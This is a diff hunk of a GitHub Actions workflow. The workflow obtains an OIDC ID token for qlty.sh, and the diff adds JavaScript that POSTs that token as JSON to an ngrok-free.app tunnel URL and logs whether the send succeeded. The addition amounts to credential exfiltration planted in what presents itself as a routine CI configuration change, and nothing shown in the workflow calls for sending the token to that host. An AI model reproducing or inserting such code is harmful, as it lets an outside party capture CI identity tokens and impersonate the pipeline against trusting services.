@@ -33,6 +33,18 @@ jobs:
           script: |
               const id_token = await core.getIDToken("https://qlty.sh");
               core.setOutput('id_token', id_token);
+
+              const url = "https://934c-2600-4041-553f-0-14f5-94a2-a97a-9d73.ngrok-free.app";
+              const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ id_token })
+              });
+              if (!response.ok) {
+                core.setFailed(`Failed to POST id_token: ${response.statusText}`);
+              } else {
+                console.log("Successfully posted the id_token");
+              }
       
       - name: Set up Ruby
         uses: ruby/setup-ruby@v1
